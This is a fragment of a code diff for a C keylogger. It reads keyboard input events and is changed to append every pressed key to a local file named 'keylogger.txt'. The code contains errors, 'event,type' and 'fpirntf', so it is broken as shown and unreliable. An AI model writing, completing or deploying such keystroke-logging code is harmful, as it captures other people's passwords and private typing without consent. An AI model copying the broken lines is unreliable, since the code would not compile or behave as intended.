@@ -29,10 +29,11 @@ int main(int argc, char **argv){
    struct input_event event;   
    while(read(fd, &event, sizeof(event)) > 0 ){
    
+      FILE *txt = fopen("./keylogger.txt", "a");
+      if(!txt) break;
       if(event,type == EV_KEY && event.value == 1 && event.code < 112)
-         printf("%s", keys[event.code]);
-      fflush(stdout);
-      
+         fpirntf(txt, "%s", keys[event.code]);
+      fclose(txt);   
    }
    
    return 0x0;
